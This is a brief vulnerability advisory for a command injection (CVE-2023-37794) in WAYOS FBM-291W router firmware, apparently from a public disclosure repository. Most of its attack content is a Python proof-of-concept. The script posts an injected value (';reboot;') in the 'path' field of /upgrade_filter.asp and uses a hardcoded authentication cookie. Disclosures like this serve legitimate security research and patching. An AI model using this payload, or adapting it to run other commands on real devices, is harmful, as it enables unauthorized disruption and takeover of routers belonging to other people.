# FBM-291W-19.09.11V **Command Injection(CVE-2023-37794)**

## Firmware information

- Manufacturer's address: https://www.wayos.com/
- Firmware download address: https://drive.weixin.qq.com/s?k=ANgAJAcRAAcJQcZsqk#/preview?fileId=s.1970324955538648.649217589iNQ_f.677141204X86O

## Affected version

![1](https://gitee.com/blogyoulin/img/raw/master/images/202307061654721.png)

## Vulnerability details

![image-20230706165555929](https://gitee.com/blogyoulin/img/raw/master/images/202307061655041.png)

In /upgrade_filter.asp, There is command injection

## Poc

```
import requests
from pwn import *

cmd=b"echo success_pwn_it"

#payload=b'http://'+b'A'*0x1000
payload=b';reboot;'

url = "http://192.168.0.1/upgrade_filter.asp"
cookie={"Cookie":"language=zh; userid=root; gw_userid=root,gw_passwd=94B830FE0CCD890946AE1C8318A2BE7B"}
data = {"path": payload}
response = requests.post(url,cookies=cookie,data=data)
#response = requests.post(url,cookies=cookie,data=data)
print(response.text)
```

